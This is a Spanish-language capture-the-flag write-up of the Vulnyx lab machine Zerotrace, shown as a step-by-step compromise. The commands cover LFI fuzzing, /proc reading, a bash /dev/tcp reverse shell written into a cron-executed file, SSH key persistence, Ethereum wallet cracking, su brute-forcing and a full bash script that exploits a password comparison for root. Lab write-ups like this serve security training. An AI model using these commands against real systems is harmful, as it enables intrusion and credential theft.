---
author: Lenam
pubDatetime: 2025-05-11T00:00:00Z
title: WriteUp Zerotrace - Vulnyx
slug: zerotrace-writeup-vulnyx-es
featured: false
draft: false
ogImage: "assets/zerotrace/OpenGraph.png"
tags:
    - Vulnyx
    - LFI
    - Wallet Cracking
    - Conditional Timing Attack
    - Inode Flags
description:
  Writeup donde describe la resolución de la máquina Zerotrace creada por suraxddq para la plataforma Vulnyx. Es el primer writeup de mi blog que no pertenece a una máquina creada por mí.
lang: es
---

![VBox](/assets/zerotrace/vbox.png)

En este writeup se describe la resolución de la máquina **Zerotrace** creada por [suraxddq](https://byte-mind.net/). Es el primer writeup de mi blog que no pertenece a una máquina creada por mí. Espero que les sirva de ayuda.

## Tabla de contenido

## Enumeración

### Nmap

Escaneamos rápidamente todos los puertos con nmap.

```bash
nmap -p- -Pn -n -sS 192.168.1.187
```

![Nmap all ports](/assets/zerotrace/nmap1.png)

Observamos tres puertos abiertos: 22, 80 y 8000. Realizamos un escaneo más detallado para identificar los servicios, versiones y posibles vectores de ataque utilizando los scripts de nmap.

```bash
nmap -p22,80,8000 -sVC -Pn -n 192.168.1.187 -o nmap.txt
```

![Nmap](/assets/zerotrace/nmap2.png)

Podemos observar que el sistema operativo es un `Debian`, el puerto **22** corresponde al servicio `SSH` con `OpenSSH`, el puerto **80** aloja un sitio web `http` con `nginx` y el puerto **8000** parece ser un servicio `FTP` implementado con `pyftpdlib`. Las versiones son actuales y no presentan vulnerabilidades aparentes.

### Enumeración manual

La enumeración manual realizada la resumo a continuación:

Accedo al sitio web, compruebo la programación donde aparece un comentario de la plantilla utilizada, descargamos el sitio web completo y también descargamos de internet la plantilla utilizada para la creación del sitio. Le aplicamos un diff a los ficheros de la plantilla utilizada con los ficheros del sitio web descargado de la máquina víctima, comprobamos las diferencias y no hay nada importante.

También intenté acceder al servicio FTP sin usuario y con el usuario `anonymous`, pero no lo conseguí.

### Fuzzing

Primero intente encontrar algo con ffuf y gobuster, utilizando el mismo diccionario.

```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.1.187/ -x .pcap,.php,.txt,.zip,.db,.htm,.html,.phar,.db,.sql,.sql.gz,.sql.zip
```

Después de varios intentos sin éxito, probé diferentes técnicas como `HTTP Request smuggling`, analicé posibles vulnerabilidades en las versiones de los servicios y ejecuté el comando `strings` en el archivo OVA, lo que me permitió descubrir información relevante como los usuarios del sistema. Ante la falta de progreso, decidí solicitar una pista a suraxddq.

![Discord](/assets/zerotrace/discord.png)

Con la pista "*Y si no lo ves... .*" me ayudó a continuar. Buscamos todos los ficheros y carpetas ocultas que empiezan con punto `.` utilizando `ffuf`.

```bash
ffuf -u http://192.168.1.187/.FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -H "User-Agent: Mozilla/5.0" -fs 153 -t 40
```

![FFUF](/assets/zerotrace/ffuf1.png)

Encontramos la carpeta `/.admin`. Continuamos con el fuzzing dentro de esta carpeta.

```bash
gobuster dir -u http://192.168.1.187/.admin/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .pcap,.php,.txt,.zip,.db,.htm,.html,.phar,.db,.sql,.sql.gz,.sql.zip
```

![gobuster](/assets/zerotrace/gobuster.png)

Encontramos el archivo `/.admin/tool.php`. Al ser un archivo PHP que no muestra ningún contenido (0 caracteres), procedimos a realizar fuzzing de parámetros tanto POST como GET para descubrir posibles vectores de entrada.

Fuzzing de parámetros POST.

```bash
ffuf -u "http://192.168.1.187/.admin/tool.php" -X POST -d "FUZZ=/etc/passwd" -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0
```

![ffuf-post](/assets/zerotrace/ffuf-post.png)

Al no encontrar resultados con el fuzzing de parámetros POST, procedimos a realizar el fuzzing de parámetros GET.

```bash
ffuf -u "http://192.168.1.187/.admin/tool.php?FUZZ=/etc/passwd" -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0
```

![ffuf-get](/assets/zerotrace/ffuf-get.png)

Encontramos el parámetro `file`. Al acceder a la URL `/.admin/tool.php?file=/etc/passwd` podemos ver el contenido del archivo `/etc/passwd` que contiene la lista de usuarios del sistema.

![ffuf-get](/assets/zerotrace/etcpasswd.png)

Utilizamos una [wordlist para LFI](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/refs/heads/main/LFI-WordList-Linux) de DragonJAR y solo podemos obtener los archivos `/etc/passwd` y `/etc/hosts`.

```bash
ffuf -u "http://192.168.1.187/.admin/tool.php?file=FUZZ" -w ./LFI-WordList-Linux -fs 0
```

![ffuf-get](/assets/zerotrace/ffuf-lfi.png)

![ffuf-get](/assets/zerotrace/etc-hosts.png)

Intentamos acceder a los archivos en el directorio `/proc` de Linux, donde podemos ver los comandos ejecutados por los servicios activos en `/proc/[PID]/cmdline`.

Primero preparamos un listado de 5000 PIDs.

```bash
seq 1 5000 > pids.txt
```

Utilizamos ffuf para descubrir qué PIDs nos permiten obtener información y guardamos los resultados en el archivo `cmd-ffuf.txt`.

```bash
ffuf -u "http://192.168.1.187/.admin/tool.php?file=/proc/FUZZ/cmdline" -w pids.txt  -fs 0 -o cmd-ffuf.txt
```

Como tenemos todas las URLs encontradas en el un XML guardado en el fichero cmd-ffuf.txt, lo utilizamos para hacer una peticion a todas las URLs con informacion y guardarlo en un fichero con el siguiente script de una linea.

```bash
jq -r '.results[].url' cmd-ffuf.txt | xargs -P4 -I {} sh -c 'echo "\n************* {}"; curl -s "{}" | tr "\0" " "'  > resultados.txt
```

Ahora podemos observar todos los comandos encontrados en el servidor en el fichero `resultados.txt`.

![resultados.txt](/assets/zerotrace/resultadostxt.png)

Encontramos el comando que inicia el servicio `FTP` en el puerto `8000`, donde se expone la contraseña utilizada del usuario `J4ckie0x17`.

## Acceso inicial con J4ckie0x17

Con la contraseña encontrada de `J4ckie0x17` podemos acceder al servicio FTP en el puerto 8000, pero no tenemos permisos para subir archivos en ninguna de las carpetas, lo que nos impide crear un webshell. Probamos la misma contraseña en el servicio SSH y efectivamente funciona, logrando así el acceso inicial al servidor.

```bash
ssh J4ckie0x17@192.168.1.187
```

![ssh J4ckie0x17](/assets/zerotrace/ssh.png)

## Movimiento lateral de J4ckie0x17 a shelldredd

Encontramos varias cosas interesantes con el usuario `J4ckie0x17`.

1. El binario `/usr/bin/chattr` tiene el bit SUID activado cuando no es habitual, este binario sirve para modificar los atributos especiales en sistemas de feichero ext2/ext3/ext4.

```bash
find / -type f -perm -4000 2>/dev/null
```

![find suid](/assets/zerotrace/suid.png)


2. Utilizamos `pspy` para monitorear los procesos activos y encontramos uno que ejecuta el usuario `shelldredd` con el `UID` 1003 muy sospechoso.

```bash
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64s && chmod +x pspy64s && ./pspy64s
```

![shelldredd process](/assets/zerotrace/shelldreddprocess.png)

```raw
CMD: UID=1003  PID=1475  | /bin/sh -c /bin/bash /opt/.nobodyshouldreadthis/destiny
```

Al examinar el binario `destiny`, parece que podemos modificarlo y no contiene ningún script, por lo que probablemente ese proceso esté mostrando un error. Sin embargo, al intentar modificarlo no podremos ya que tiene el flag de inmutable de los atributos especiales del sistema de ficheros EXT.

```bash
lsattr /opt/.nobodyshouldreadthis/destiny
```

![destiny inmutable](/assets/zerotrace/inmutable.png)

Utilizamos el binario `chattr` con permisos SUID para quitar el flag de inmutable.

```bash
chattr -i /opt/.nobodyshouldreadthis/destiny
```

![destiny no inmutable](/assets/zerotrace/inmutable2.png)

Ahora podemos modificar el archivo `destiny`, añadiendo un shell inverso que apunte a nuestra máquina atacante en el puerto 443.

```bash
echo 'bash -i >& /dev/tcp/192.168.1.181/443 0>&1' > /opt/.nobodyshouldreadthis/destiny
```

En nuestra máquina atacante iniciamos un listener con netcat.

```bash
nc -lvnp 443
```

Tras esperar aproximadamente un minuto, recibimos una shell inversa con privilegios del usuario `shelldredd`.

![shell con shelldredd](/assets/zerotrace/shell-shelldredd.png)

## Movimiento lateral de shelldredd a ll104567

Antes de continuar, instalamos nuestra clave pública en el directorio `.ssh` del usuario `shelldredd` para facilitar el acceso mediante SSH y mantener la persistencia.

Utilizamos nuestra clave pública.

```bash
mkdir .ssh && echo "ssh-ed25519 AAAAC.....CxOr3 kali@kali" > ./.ssh/authorized_keys && chmod 600 ./.ssh/authorized_keys
```

Ahora podemos conectarnos mediante SSH desde nuestro host para obtener una shell completa y mantener la persistencia.

```bash
ssh shelldredd@192.168.1.187
```

Encontramos varias cosas interesantes en el servidor, tenemos acceso al home del usuario `ll104567` y observamos tres ficheros interesantes:

   - `guessme` ejecutable vulnerable a ataque de temporización en la condición `[[ $FTP_PASS == $CLEAN_PASS ]]`, parece necesitar de más privilegios para su ejecución.
   - `one` una lista de personajes que tienen que ver con el universo **One-Punch Man**, completamente desconocido para mí. Con un mensaje al principio que dice: `Why don't we join two universes and see who's the strongest?`.
   - `user.txt` la primera bandera del reto, pero sin permisos de lectura.

También encontramos una carpeta que parece ser una wallet de crypto `/opt/cryptovault/ll104567` con tres ficheros:

   - `notes.txt` donde parece haber un mensaje dirigido a nuestro amigo `ll104567`.
   - `secret` donde hay un fichero `json` que parece ser la clave privada de una cryptowallet.
   - `why.png` imágen de Donald Trump, está por todos lados.

### Cracking Crypto Wallet

Desde nuestro host, copiamos los archivos del cryptovault de `ll104567` a nuestra máquina utilizando `scp`, ya que tenemos nuestra clave pública instalada.

```bash
scp -r shelldredd@192.168.1.187:/opt/cryptovault/ll104567 .
```

![scp vault](/assets/zerotrace/scp-vault.png)

Siguiendo las técnicas descritas en el análisis de vulnerabilidades en archivos keystore de wallets Ethereum, procedimos a intentar crackear la wallet.

[Análisis Sistemático de Vulnerabilidades en Archivos Keystore de Wallets Ethereum](https://www.researchgate.net/publication/337610456_Attainable_Hacks_on_Keystore_Files_in_Ethereum_Wallets-A_Systematic_Analysis)

Primero debemos obtener el hash del wallet utilizando `ethereum2john`, que usaremos posteriormente para crackearlo.

```bash
ethereum2john secret
```

![ethereum2john](/assets/zerotrace/ethereum2john.png)

Guardamos el `hash` en un fichero.

![ethereum2john](/assets/zerotrace/hash.png)

Procedemos a intentar crackearlo con `hashcat`.

```bash
hashcat -m 15700 hash /usr/share/wordlists/rockyou.txt -w 4
```

Tras un tiempo de espera, hashcat descubre la contraseña `dragonballz` que se encuentra en la línea 3186 del diccionario rockyou.txt.

```bash
hashcat -m 15700 hash /usr/share/wordlists/rockyou.txt --show
```

![wallet pass](/assets/zerotrace/walletpass.png)

### Contraseña de ll104567 y diccionario

En este momento sabía que algo tenía que ver con **Dragon Ball Z** y **One-Punch Man**, dos animes; el primero lo conocía, el segundo no. Estuve creando diccionarios con los personajes de ambos animes y probando varias combinaciones. Incluso visualicé un video de YouTube donde aparecía Son Goku luchando contra One-Punch Man, pero no me sirvió de nada.

Al final solo se necesitaba combinar la contraseña del wallet `dragonballz` con el diccionario de personajes del archivo `one` del directorio home del usuario `ll104567`.

En el directorio home de shelldredd creamos un diccionario con el archivo `/home/ll104567/one` añadiendo `dragonballz` al inicio de cada línea.

```bash
sed 's/^/dragonballz/' ../ll104567/one > ~/diccionario.txt
```

![Diccionario password](/assets/zerotrace/diccionario.png)

Descargamos la herramienta `suForce` de d4t4s3c, herramienta muy util para hacer fuerza bruta.

```bash
wget --no-check-certificate -q "https://raw.githubusercontent.com/d4t4s3c/suForce/refs/heads/main/suForce" && chmod +x suForce 
```

y la utilizamos con el diccionario creado para intentar obtener la contraseña del usuario ll104567.

```bash
./suForce -u ll104567 -w ./diccionario.txt
```

![suForce](/assets/zerotrace/suforce.png)

¡Bingo! Obtenemos la contraseña del usuario ll104567.

## Escalada privilegios de ll104567 a root

Ahora que tenemos acceso como usuario ll104567, podemos proceder a leer la flag del usuario (user.txt) que anteriormente no teníamos permisos para acceder.

Utilizando `su` desde el usuario shelldredd o accediendo mediante `SSH` con la contraseña obtenida accedemos como el usuario `ll104567`.

```bash
su ll104567
```

![su](/assets/zerotrace/su.png)

El usuario `ll104567` tiene permisos para ejecutar como `root` mediante sudo el ejecutable `/home/ll104567/guessme` que analizamos previamente y era vulnerable.

```bash
sudo -l
```

Analizamos el script `guessme` y utilizamos ChatGPT para generar un script en bash que aproveche la vulnerabilidad y adivine la contraseña. En este punto estábamos un poco cansados y no teníamos ganas de escribir código 😅

**getpass.sh**

```bash
#!/bin/bash
# Conjunto de caracteres a probar; puedes ampliarlo según tus necesidades.
alphabet='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{};:,.<>/?`~'

# Variable para almacenar el prefijo encontrado (la contraseña)
password=""

# Función que ejecuta guessme con un input dado y devuelve la salida
function test_guess() {
    local guess="$1"
    # Se envía el input sin salto de línea adicional
    echo -n "$guess" | sudo /bin/bash /home/ll104567/guessme 2>/dev/null
}

echo "Iniciando extracción de contraseña..."

while true; do
    # Primero, probamos si el prefijo actual ya es la contraseña completa.
    output=$(test_guess "$password")
    if [[ "$output" == *"Password matches!"* ]]; then
        echo "¡Contraseña encontrada: $password!"
        break
    fi

    found=0
    # Iteramos por cada carácter del alfabeto
    for (( i=0; i<${#alphabet}; i++ )); do
        c="${alphabet:$i:1}"
        guess="${password}${c}*"
        output=$(test_guess "$guess")
        if [[ "$output" == *"Password matches!"* ]]; then
            password="${password}${c}"
            echo "Caracter encontrado: '$c' -> Contraseña parcial: $password"
            found=1
            break
        fi
    done

    # Si no se encontró extensión, se detiene el script.
    if [ $found -eq 0 ]; then
        echo "No se pudo extender la contraseña. Contraseña parcial: $password"
        break
    fi
done
```

Copiamos el código y creamos un archivo en el directorio home del usuario, le asignamos permisos de ejecución y lo ejecutamos.

![root pass](/assets/zerotrace/rootpass.png)

Una vez obtenida la contraseña del usuario `root` mediante el script, utilizamos el comando `su` para cambiar al usuario root. Finalmente, leemos el contenido del archivo `root.txt` que contiene la flag final del sistema.

![root flag](/assets/zerotrace/rootflag.png)

Agradezco a suraxddq por esta excelente máquina virtual. A través de este laboratorio, he adquirido conocimientos valiosos sobre la seguridad de las wallets de Ethereum y las vulnerabilidades asociadas a su implementación.

